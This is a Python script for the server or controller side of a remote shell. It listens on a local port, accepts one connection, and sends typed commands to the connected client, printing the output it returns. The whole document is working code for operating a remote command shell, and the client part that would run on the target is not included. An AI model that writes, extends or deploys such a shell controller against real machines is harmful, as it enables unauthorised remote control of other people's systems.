#!/usr/bin/python3

# Server-side


import socket
import os

host = '127.0.0.1'
port = 8080

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
server.listen(1)
print(f'\nlistening on \033[2m{port}...\033[m')

client, addr = server.accept()
print(f'\n\033[1;32m[+]\033[m connection establish: {addr[0]}:{addr[1]}')


def shell():
    while True:
        try:
            comm = str(input(f'\033[1;35mshell\033[m~{addr[0]}: '))
            if comm == '':
                pass
            elif comm == 'close':
                client.send(comm.encode())
                break
            elif comm == 'clear':
                os.system(comm)
            elif comm[:3] == 'cd ':
                client.send(comm.encode())
            elif comm[:5] == 'mkdir':
                client.send(comm.encode())
            elif comm[:5] == 'touch':
                client.send(comm.encode())
            elif comm[:5] == 'start':
                client.send(comm.encode())
            elif comm[:4] == 'open':
                client.send(comm.encode())
            else:
                try:
                    client.send(comm.encode())
                    output = client.recv(1024).decode()
                    print(output)
                except socket.error as e:
                    print(f'Error: {e}')
        except (ValueError, TypeError, IndexError) as e:
            print(f'\nError: {e}')

    server.close()
    print('connection closed.')


shell()



